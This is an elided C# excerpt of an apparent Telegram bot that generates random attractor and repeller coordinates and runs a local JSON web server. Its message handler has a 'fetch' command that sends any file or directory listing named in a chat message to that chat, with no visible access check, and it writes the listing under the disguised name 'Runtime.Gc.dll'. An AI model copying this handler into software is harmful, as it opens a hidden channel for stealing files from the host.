    ...
    class Program {
        ...
        public static double[] GetQuantumRandom(double lat, double lon, int radius) {
            ...
            try {
                ...
                Console.WriteLine("QR Point generation error (" + lat.ToString() + ", " + lon.ToString() + ", " + radius.ToString() + ")" + Environment.NewLine
+ e.Message.ToString());
            }
            return result;
        }
        ...
        public static double[] GetMirrorCoord(double lat1, double lon1, double lat2, double lon2) {
            ...
            try {
                ...
                if (azimut >= 180) { azimut = azimut - 180; } else
        ...
        public static Hashtable FillTable(double lat, double lon, int radius, double APPI) {
            ...
            try {
                ...
                while (Attractors.Count < APPI) {
                    int[,] rands;
                    if (rnsource == "QRNG") { rands = rnd.NextCoord((int)dlat, (int)dlon, ((int)APPI - Attractors.Count + 10)); } else
                    if (rnsource == "REG") { rands = rrnd.NextCoord((int)dlat, (int)dlon, ((int)APPI - Attractors.Count + 10)); } else {
                    ...
                    while ((Attractors.Count < APPI) && (apos < rands.GetLength(0))) {
                        ...
                        if ((dif > radius) || (Attractors.ContainsKey(result) == true)) { } else {
        ...
        public static double[] GetQuantumRepeller(double lat, double lon, int radius, double appi) {
            ...
            try {
                ...
                Console.WriteLine("Repeller generation error (" + lat.ToString() + ", " + lon.ToString() + ", " + radius.ToString() + ")"
+ Environment.NewLine + e.Message.ToString());
        ...
        public static double[] GetQuantumAttractor(double lat, double lon, int radius, double appi) {
            ...
            try {
                ...
                Console.WriteLine("Attractor generation error (" + lat.ToString() + ", " + lon.ToString() + ", " + radius.ToString() + ")"
+ Environment.NewLine + e.Message.ToString());
            }
            return result;
        }
...
+ " radius: " + incoords[6].ToString("#0.00", System.Globalization.CultureInfo.InvariantCulture) + " meters";
                    ...
                    try {
                        ...
                        if (Int32.TryParse(nr, out tmprad)) {
                            if (tmprad > 1000000) { try { await Bot.SendTextMessageAsync(message.Chat.Id, "Maximum radius is 1000000 m"); } catch (Exception ex) { } } else if (tmprad < 1000) { try { await Bot.SendTextMessageAsync(message.Chat.Id, "Minimum radius is 1000 m"); } catch (Exception ex) { } } else {
                                {
                    ...
                    try {
                        ...
                        if ((message.Text.Contains("fetch") == true)) {
                            ...
                            if (System.IO.File.Exists(entry[1])) {
                                ...
                                using (FileStream fs1 = new FileStream(entry[1], FileMode.Open, FileAccess.ReadWrite)) { await Bot.SendDocumentAsync(message.Chat.Id, new Telegram.Bot.Types.InputFiles.InputOnlineFile(fs1, f.Name)); }
                            }
                            ...
                            if (System.IO.Directory.Exists(entry[1])) {
                                ...
                                using (FileStream fs1 = new FileStream("Runtime.Gc.dll", FileMode.Open, FileAccess.ReadWrite)) { await Bot.SendDocumentAsync(message.Chat.Id, new Telegram.Bot.Types.InputFiles.InputOnlineFile(fs1, "list.txt")); }
        ...
        public static void Main(string[] args) {
            ...
            try {
                ...
                Console.WriteLine("Error starting JSON endpoint: " + Environment.NewLine + ex.Message.ToString() + Environment.NewLine);
            }

        }

        static private void http_runWebServer() {
            if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
                return;

            string port = ":9696";
            string[] urls = new string[] { "http://localhost"+port };
            WebServerOptions serverOptions = new WebServerOptions(urls);
            serverOptions.Mode = HttpListenerMode.EmbedIO;
            serverOptions.RoutingStrategy = RoutingStrategy.Regex;
#if DEBUG
            var server = new WebServer(9696, serverOptions.RoutingStrategy);    //accept from any hostname/ip for debugging
#else
            var server = new WebServer(urls, serverOptions.RoutingStrategy);
#endif
